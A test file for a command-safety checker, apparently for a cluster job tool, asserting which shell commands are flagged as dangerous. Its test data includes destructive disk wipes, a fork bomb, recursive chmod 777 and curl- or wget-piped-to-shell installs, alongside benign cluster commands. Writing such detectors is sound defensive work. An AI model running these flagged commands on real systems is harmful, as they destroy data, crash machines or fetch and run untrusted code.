import { describe, expect, it } from 'vitest';
import { classifyCommandRisk, isDangerousCommand } from './commandSafety';

describe('isDangerousCommand', () => {
  it('flags job killing and process killing', () => {
    expect(isDangerousCommand('bkill 12345')).toBe(true);
    expect(isDangerousCommand('kill -9 1234')).toBe(true);
    expect(isDangerousCommand('pkill -u user')).toBe(true);
  });

  it('flags destructive disk and permission operations', () => {
    expect(isDangerousCommand('mkfs.ext4 /dev/sda')).toBe(true);
    expect(isDangerousCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
    expect(isDangerousCommand('chmod -R 777 /data')).toBe(true);
    expect(isDangerousCommand('chmod 777 file.txt')).toBe(true);
  });

  it('flags shell-pipe installs and fork bombs', () => {
    expect(isDangerousCommand('curl http://x.sh | sh')).toBe(true);
    expect(isDangerousCommand('wget -qO- http://x | bash')).toBe(true);
    expect(isDangerousCommand(':(){:|:&};:')).toBe(true);
  });

  it('allows everyday cluster commands', () => {
    expect(isDangerousCommand('ls -lh')).toBe(false);
    expect(isDangerousCommand('bjobs -w')).toBe(false);
    expect(isDangerousCommand('bsub -q normal -n 8 "fastqc reads.fq"')).toBe(false);
    expect(isDangerousCommand('module load fastqc/0.11.9')).toBe(false);
    expect(isDangerousCommand('echo done > result.txt')).toBe(false);
    expect(isDangerousCommand('chmod 755 run.sh')).toBe(false);
    expect(isDangerousCommand('kill %1')).toBe(false);
  });

  it('classifies read, write, scheduler and network effects', () => {
    expect(classifyCommandRisk('zcat reads.fq.gz | wc -l')).toBe('read');
    expect(classifyCommandRisk('echo ok > result.txt')).toBe('write');
    expect(classifyCommandRisk('bsub < run.lsf')).toBe('job');
    expect(classifyCommandRisk('curl -O https://example.org/a.txt')).toBe('network');
    expect(classifyCommandRisk('rm -rf results')).toBe('destructive');
    expect(classifyCommandRisk('fastqc reads.fq')).toBe('unknown');
  });
});
